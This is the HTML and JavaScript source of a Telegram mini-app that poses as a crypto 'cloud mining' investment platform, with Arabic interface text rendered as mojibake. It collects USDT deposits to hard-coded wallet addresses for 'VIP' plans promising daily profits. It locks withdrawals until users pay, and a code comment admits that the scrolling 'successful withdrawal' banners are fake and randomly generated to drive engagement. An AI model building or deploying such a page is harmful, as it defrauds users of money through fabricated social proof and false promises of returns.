<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>GoldDrip Global Elite</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/3.3.4/vue.global.min.js"></script>
    <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/vant@4/lib/index.css" />
    <script src="https://fastly.jsdelivr.net/npm/vant@4/lib/vant.min.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root { --gold: #FFD700; --dark-bg: #0b0b0b; --card: rgba(255, 255, 255, 0.05); }
        body { background: var(--dark-bg); color: #fff; font-family: 'Cairo', sans-serif; margin: 0; padding-bottom: 100px; overflow-x: hidden; }
        .glass-card { background: var(--card); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; padding: 20px; margin: 15px; }
        .gold-gradient { background: linear-gradient(45deg, #FFD700, #FDB931, #B8860B); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: bold; }
        
        /* Ø´Ø±ÙŠØ· Ø§Ù„Ø¥Ø¹Ù„Ø§Ù†Ø§Øª Ù„Ù„Ø³Ø­ÙˆØ¨Ø§Øª */
        .withdraw-notice { background: rgba(255, 215, 0, 0.1) !important; color: var(--gold) !important; font-size: 11px !important; border-bottom: 1px solid rgba(255,215,0,0.1); }

        /* Ø£Ø²Ø±Ø§Ø± Ø§Ù„Ø¥ÙŠØ¯Ø§Ø¹ Ø§Ù„Ø¹ØµØ±ÙŠØ© */
        .deposit-option { border: 1px solid rgba(255,255,255,0.1); border-radius: 15px; padding: 10px; display: flex; align-items: center; gap: 10px; margin-bottom: 10px; cursor: pointer; transition: 0.3s; }
        .deposit-option.active { border-color: var(--gold); background: rgba(255,215,0,0.05); }
        .crypto-logo { width: 30px; height: 30px; border-radius: 50%; }

        /* ÙƒØ±ÙˆØª VIP Ø§Ù„Ù…ØªØ·ÙˆØ±Ø© */
        .vip-card { background: linear-gradient(135deg, rgba(255,215,0,0.1) 0%, rgba(0,0,0,0.8) 100%); border: 1px solid rgba(255,215,0,0.2); border-radius: 25px; padding: 20px; margin-bottom: 20px; position: relative; }
        .vip-price { font-size: 30px; font-weight: bold; color: var(--gold); }
        .vip-benefit { font-size: 12px; color: #ccc; display: flex; align-items: center; gap: 5px; margin-top: 5px; }

        /* Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ†Ù‚Ù„ Ø§Ù„Ø³ÙÙ„ÙŠ */
        .nav-bar { position: fixed; bottom: 15px; left: 15px; right: 15px; background: rgba(15, 15, 15, 0.95); border-radius: 22px; display: flex; justify-content: space-around; padding: 12px; border: 1px solid #333; z-index: 1000; }
        .nav-btn { color: #666; text-align: center; font-size: 11px; }
        .nav-btn.active { color: var(--gold); }
        
        /* Ø¥Ø²Ø§Ù„Ø© Ø§Ù„ØµÙŠÙ†ÙŠØ© ÙˆØªØµØ­ÙŠØ­ Ø§Ù„Ø­ÙˆØ§Ø±Ø§Øª */
        .van-dialog { border-radius: 24px !important; background: #1a1a1a !important; color: #fff !important; }
        .van-dialog__header { color: var(--gold) !important; }
        .van-button--default { background: #2a2a2a !important; color: #fff !important; border: none !important; }
        .van-button--primary { background: var(--gold) !important; color: #000 !important; font-weight: bold !important; border: none !important; }
    </style>
</head>
<body>
<div id="app" v-cloak>
    <van-notice-bar class="withdraw-notice" left-icon="volume-o" :text="liveNotice" scrollable />

    <div v-if="activeTab === 'home'">
        <div class="glass-card" style="text-align: center;">
            <p style="color: #888; margin:0; font-size: 12px;">Ø§Ù„Ø±ØµÙŠØ¯ Ø§Ù„Ù‚Ø§Ø¨Ù„ Ù„Ù„Ø³Ø­Ø¨</p>
            <h1 class="gold-gradient" style="font-size: 42px; margin: 5px 0;">${{ (user?.balance || 0).toFixed(4) }}</h1>
            <div style="font-size: 12px; opacity: 0.8;">
                <span>VIP {{ user?.vip || 0 }}</span> | Ø³Ø±Ø¹Ø© Ø§Ù„ØªØ¹Ø¯ÙŠÙ†: {{ speedMultiplier }}x
            </div>
        </div>

        <div style="text-align: center; margin: 25px 0;">
            <div style="width: 170px; height: 170px; border-radius: 50%; border: 4px solid var(--gold); margin: 0 auto; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle, rgba(253,185,49,0.15) 0%, transparent 70%); cursor: pointer; transition: 0.2s;" @click="mine">
                <i class="fa-solid fa-microchip" style="font-size: 75px; color: var(--gold); filter: drop-shadow(0 0 10px var(--gold));"></i>
            </div>
            <p style="margin-top: 15px; font-size: 13px; color: #666;">Ø§Ù†Ù‚Ø± Ù„ØªÙˆÙ„ÙŠØ¯ Ø§Ù„Ø£Ø±Ø¨Ø§Ø­ Ø§Ù„Ø³Ø­Ø§Ø¨ÙŠØ©</p>
        </div>

        <div style="display: flex; gap: 12px; padding: 0 15px;">
            <van-button block round plain color="#FFD700" @click="showWithdraw=true">Ø³Ø­Ø¨</van-button>
            <van-button block round color="linear-gradient(45deg, #FFD700, #B8860B)" @click="showDeposit=true">
                <span style="color:#000; font-weight:bold">Ø¥ÙŠØ¯Ø§Ø¹</span>
            </van-button>
        </div>
    </div>

    <div v-if="activeTab === 'plans'" style="padding: 15px;">
        <h2 class="gold-gradient" style="text-align: center;">Ø®Ø·Ø· Ø§Ù„Ø§Ø³ØªØ«Ù…Ø§Ø± Ø§Ù„Ù…Ù„ÙƒÙŠØ© ğŸ‘‘</h2>
        
        <div class="vip-card">
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <b>Ø¨Ø§Ù‚Ø© VIP 1</b>
                <div class="vip-price">$1</div>
            </div>
            <div class="vip-benefit"><i class="fa-solid fa-check-circle"></i> Ø±Ø¨Ø­ ÙŠÙˆÙ…ÙŠ: <b>$0.15</b></div>
            <div class="vip-benefit"><i class="fa-solid fa-lock-open"></i> ØªÙØªØ­ Ù…ÙŠØ²Ø© Ø§Ù„Ø³Ø­Ø¨ ÙÙˆØ±Ø§Ù‹</div>
            <van-button block round color="#FFD700" size="small" style="margin-top: 15px;" @click="openPlan('1')">
                <span style="color:#000; font-weight:bold">ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø¹Ø¶ÙˆÙŠØ©</span>
            </van-button>
        </div>

        <div class="vip-card" style="border-color: #00ff00;">
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <b>Ø¨Ø§Ù‚Ø© VIP 2</b>
                <div class="vip-price" style="color: #00ff00;">$5</div>
            </div>
            <div class="vip-benefit"><i class="fa-solid fa-check-circle"></i> Ø±Ø¨Ø­ ÙŠÙˆÙ…ÙŠ: <b>$1.00</b></div>
            <div class="vip-benefit"><i class="fa-solid fa-rocket"></i> Ø²ÙŠØ§Ø¯Ø© Ø³Ø±Ø¹Ø© Ø§Ù„ØªØ¹Ø¯ÙŠÙ† +30%</div>
            <van-button block round color="#00ff00" size="small" style="margin-top: 15px;" @click="openPlan('5')">
                <span style="color:#000; font-weight:bold">ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø¹Ø¶ÙˆÙŠØ©</span>
            </van-button>
        </div>
    </div>

    <van-notice-bar v-if="activeTab === 'home'" style="position:fixed; bottom:85px; width:100%; height:30px; background:rgba(0,0,0,0.8); font-size:10px;" color="#FFD700" text="Ø§Ù†Ø¶Ù… Ø¥Ù„Ù‰ VIP Ù„ØªØ³Ø±ÙŠØ¹ ØªØ¹Ø¯ÙŠÙ†Ùƒ ÙˆÙØªØ­ Ø³Ø­Ø¨ Ø§Ù„Ø£Ø±Ø¨Ø§Ø­ ÙÙˆØ±Ø§Ù‹! Ø§Ø³ØªØ«Ù…Ø± ÙÙŠ Ø§Ù„Ø°Ù‡Ø¨ Ø§Ù„Ø±Ù‚Ù…ÙŠ Ø§Ù„Ø¢Ù†." />

    <div class="nav-bar">
        <div class="nav-btn" :class="{active: activeTab==='home'}" @click="activeTab='home'"><i class="fa-solid fa-house" style="font-size:20px;"></i><div>Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©</div></div>
        <div class="nav-btn" :class="{active: activeTab==='plans'}" @click="activeTab='plans'"><i class="fa-solid fa-gem" style="font-size:20px;"></i><div>VIP</div></div>
        <div class="nav-btn" @click="activeTab='about'"><i class="fa-solid fa-shield-halved" style="font-size:20px;"></i><div>Ø§Ù„Ø£Ù…Ø§Ù†</div></div>
    </div>

    <van-dialog v-model:show="showDeposit" title="Ø¥ÙŠØ¯Ø§Ø¹ Ø¢Ù…Ù†" show-cancel-button confirm-button-text="ØªØ£ÙƒÙŠØ¯" cancel-button-text="Ø¥Ù„ØºØ§Ø¡" @confirm="confirmDeposit">
        <div style="padding: 20px; color: #fff;">
            <p style="font-size:11px; color:#888; margin-bottom:15px;">Ø§Ø®ØªØ± Ø§Ù„Ø´Ø¨ÙƒØ© Ù„Ø¥Ø¸Ù‡Ø§Ø± Ø¹Ù†ÙˆØ§Ù† Ø§Ù„Ù…Ø­ÙØ¸Ø© Ø§Ù„Ø®Ø§Øµ Ø¨Ù†Ø§:</p>
            
            <div class="deposit-option" :class="{active: net==='TRC20'}" @click="net='TRC20'">
                <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="crypto-logo">
                <div><b>USDT (TRC20)</b><div style="font-size:10px; color:#666;">Ø´Ø¨ÙƒØ© ØªØ±ÙˆÙ†</div></div>
            </div>

            <div class="deposit-option" :class="{active: net==='BEP20'}" @click="net='BEP20'">
                <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="crypto-logo">
                <div><b>USDT (BEP20)</b><div style="font-size:10px; color:#666;">Ø´Ø¨ÙƒØ© Ø¨ÙŠÙ†Ø§Ù†Ø³</div></div>
            </div>

            <div style="background: rgba(255,215,0,0.05); padding: 12px; border-radius: 12px; border: 1px dashed var(--gold); margin: 15px 0; font-size: 11px; word-break: break-all; text-align: center; color: var(--gold);">
                {{ net==='TRC20' ? 'TEsCEHSkKwWTLLdEuGCHnpf23e8Sv3cZto' : '0x88bea8db94f9428f282b2cc375ec68ac67fd9200' }}
            </div>
            
            <van-field v-model="tx" label="TXID" placeholder="Ø£Ø¯Ø®Ù„ Ø±Ù‚Ù… Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ù‡Ù†Ø§" style="background:#222; border-radius:10px; margin-top:10px;"></van-field>
        </div>
    </van-dialog>

    <van-dialog v-model:show="showWithdraw" title="Ø³Ø­Ø¨ Ø§Ù„Ø£Ø±Ø¨Ø§Ø­" show-cancel-button confirm-button-text="Ø³Ø­Ø¨" cancel-button-text="Ø¥Ù„ØºØ§Ø¡" @confirm="requestWithdraw">
        <div style="padding: 20px;">
            <van-field v-model="wAmt" type="number" label="Ø§Ù„Ù…Ø¨Ù„Øº" placeholder="Ø£Ù‚Ù„ Ù…Ø¨Ù„Øº Ù„Ù„Ø³Ø­Ø¨ 2$"></van-field>
            <van-field v-model="wAddr" label="Ø§Ù„Ù…Ø­ÙØ¸Ø©" placeholder="Ø¹Ù†ÙˆØ§Ù† Ù…Ø­ÙØ¸ØªÙƒ USDT"></van-field>
        </div>
    </van-dialog>
</div>

<script>
    const { createApp, ref, onMounted, computed } = Vue;
    const { showToast, showDialog } = vant;
    const SERVER = "https://steep-resonance-6443.alaabdalaziz01.workers.dev";

    createApp({
        setup() {
            // Ø­Ù„ Ù…Ø´ÙƒÙ„Ø© Undefined: ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ÙƒØ§Ø¦Ù† Ø¨Ù‚ÙŠÙ… Ø§ÙØªØ±Ø§Ø¶ÙŠØ©
            const user = ref({ balance: 0, referralCount: 0, vip: 0 });
            const activeTab = ref('home');
            const userId = ref("");
            const showDeposit = ref(false);
            const showWithdraw = ref(false);
            const net = ref("TRC20");
            const tx = ref("");
            const wAmt = ref("");
            const wAddr = ref("");
            const liveNotice = ref("Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø³Ø­ÙˆØ¨Ø§Øª...");

            const speedMultiplier = computed(() => (1 + (user.value?.referralCount || 0) * 0.1).toFixed(1));

            onMounted(async () => {
                if (window.Telegram?.WebApp) {
                    const tg = window.Telegram.WebApp;
                    tg.expand();
                    if (tg.initDataUnsafe?.user) {
                        userId.value = tg.initDataUnsafe.user.id;
                        await apiRequest('login');
                    }
                }
                // Ø¥Ø´Ø¹Ø§Ø±Ø§Øª ÙˆÙ‡Ù…ÙŠØ© Ù„Ø²ÙŠØ§Ø¯Ø© Ø§Ù„ØªÙØ§Ø¹Ù„
                setInterval(() => {
                    const amounts = ["2.5", "5.0", "1.2", "10.0", "4.4"];
                    const id = Math.floor(Math.random() * 99);
                    liveNotice.value = `ØªÙ‡Ù†Ø¦Ø©! Ø§Ù„Ø¹Ø¶Ùˆ User***${id} Ø³Ø­Ø¨ ${amounts[Math.floor(Math.random()*5)]}$ Ø¨Ù†Ø¬Ø§Ø­.`;
                }, 7000);
            });

            const apiRequest = async (action, data = {}) => {
                try {
                    const res = await fetch(SERVER, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ action, userId: userId.value, ...data })
                    });
                    const result = await res.json();
                    if (result && !result.error) {
                        user.value = result.balance !== undefined ? result : result.user;
                        return result;
                    } else if (result?.error) showToast(result.error);
                } catch (e) { console.error("API Error"); }
            };

            const mine = () => {
                // Ø­Ù„ Ø§Ù„Ø®Ø·Ø£: Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù‚Ø¨Ù„ ØªÙ†ÙÙŠØ° Ø§Ù„Ø·Ù„Ø¨
                if (!userId.value) return showToast("Ø§Ù†ØªØ¸Ø± ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...");
                if (window.Telegram.WebApp.HapticFeedback) window.Telegram.WebApp.HapticFeedback.impactOccurred('medium');
                apiRequest('mine', { amount: 0.01 });
            };

            const openPlan = (price) => {
                showToast(`ÙŠØ±Ø¬Ù‰ Ø¥Ø±Ø³Ø§Ù„ ${price}$ Ù„ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø®Ø·Ø©`);
                showDeposit.value = true;
            };

            const confirmDeposit = async () => {
                if(!tx.value) return showToast('Ø£Ø¯Ø®Ù„ Ø±Ù‚Ù… Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø£ÙˆÙ„Ø§Ù‹');
                await apiRequest('request_deposit', { txId: tx.value, network: net.value });
                showDialog({ message: 'ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨! Ø³ÙŠØªÙ… Ù…Ø±Ø§Ø¬Ø¹Ø© Ø§Ù„Ø¹Ù…Ù„ÙŠØ© ÙˆØªÙØ¹ÙŠÙ„ Ø­Ø³Ø§Ø¨Ùƒ ÙŠØ¯ÙˆÙŠØ§Ù‹ âœ…' });
            };

            const requestWithdraw = async () => {
                if (user.value.vip < 1) return showDialog({ message: 'Ø§Ù„Ø³Ø­Ø¨ Ù…ØªØ§Ø­ ÙÙ‚Ø· Ù„Ù…Ø´ØªØ±ÙƒÙŠ VIP 1 Ø£Ùˆ Ø£Ø¹Ù„Ù‰' });
                await apiRequest('request_withdraw', { amount: wAmt.value, wallet: wAddr.value });
            };

            return { user, activeTab, speedMultiplier, showDeposit, showWithdraw, net, tx, wAmt, wAddr, liveNotice, mine, openPlan, confirmDeposit, requestWithdraw };
        }
    }).use(vant).mount('#app');
</script>
</body>
    </html>
        
